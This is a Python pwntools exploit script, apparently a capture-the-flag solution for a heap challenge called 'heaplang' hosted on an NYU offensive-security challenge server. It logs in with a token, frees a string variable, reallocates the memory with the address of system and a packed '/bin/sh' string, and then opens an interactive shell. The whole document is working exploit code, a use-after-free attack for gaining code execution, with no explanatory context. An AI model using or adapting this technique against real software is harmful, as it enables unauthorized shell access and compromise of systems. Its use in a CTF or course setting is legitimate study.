from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal=['tmux','split','-h']
r = process('./heaplang', env={'LD_PRELOAD': './libc-2.23.so'})
e = ELF('./heaplang')
libc = ELF("./libc-2.23.so")

def create_num(vartype, content):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil("?")
    r.sendline(str(vartype))
    r.recvuntil("?")
    #r.sendline(str(len(content)))
    #r.recvuntil("?")
    r.sendline(content)


def create_string(vartype, content):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil("?")
    r.sendline(str(vartype))
    r.recvuntil("?")
    r.sendline(str(len(content)))
    r.recvuntil("?")
    r.sendline(content)



def delete(idx):
    r.recvuntil(">")
    r.sendline("4")
    r.recvuntil("?")
    r.sendline(str(idx))


def printvar(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil("?")
    r.sendline(str(idx))

r = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1345)
sla 		= lambda a,b: r.sendlineafter(a,b)
sa 			= lambda a,b: r.sendafter(a,b)
ra 			= lambda a: r.readuntil(a)

sla(":", b'rt1726')

create_string(1, "\00"*16)

delete(0)

create_num(0, str(e.sym.system))

create_num(0, "0x3b68732f6e69622f") # "/bin/sh"

printvar(0)


r.interactive()
